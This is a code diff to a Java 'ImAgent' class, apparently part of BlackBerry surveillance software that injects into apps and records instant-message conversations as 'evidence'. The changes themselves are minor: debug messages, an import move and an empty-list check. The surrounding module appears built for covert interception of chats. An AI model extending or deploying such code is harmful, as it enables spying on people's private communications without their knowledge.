@@ -18,13 +18,13 @@ import blackberry.Device;
 import blackberry.agent.im.LineMarkup;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
-import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -116,18 +116,18 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
     private synchronized String unserialize(String partecipants) {
         //#ifdef DEBUG
-        debug.trace("unserialize");
+        debug.trace("unserialize: "+partecipants);
         //#endif
 
         if (markup.isMarkup()) {
             String lastLine = markup.getLine(partecipants);
 
             //#ifdef DEBUG
-            debug.trace("unserialize: " + lastLine);
+            debug.trace("unserialized: " + lastLine);
             //#endif
             return lastLine;
-
         }
+        
         return null;
     }
 
@@ -251,6 +251,13 @@ public final class ImAgent extends Agent implements BacklightObserver,
         //#ifdef DEBUG
         debug.trace("add : " + partecipants + " lines: " + lines.size());
         //#endif
+        
+        if(lines.size()==0){
+            //#ifdef DEBUG
+            debug.trace("add: no lines, skipping");
+            //#endif
+            return;
+        }
 
         //#ifdef DBC
         Check.asserts(lines != null, "null lines");
@@ -290,7 +297,7 @@ public final class ImAgent extends Agent implements BacklightObserver,
 
             serialize(partecipants, lastLine);
             //#ifdef DEBUG
-            debug.trace("write evidence from line: " + lastEqual + 1);
+            debug.trace("write evidence from line: " + (lastEqual + 1));
             //#endif
             writeEvidence(partecipants, lines, lastEqual + 1);
 
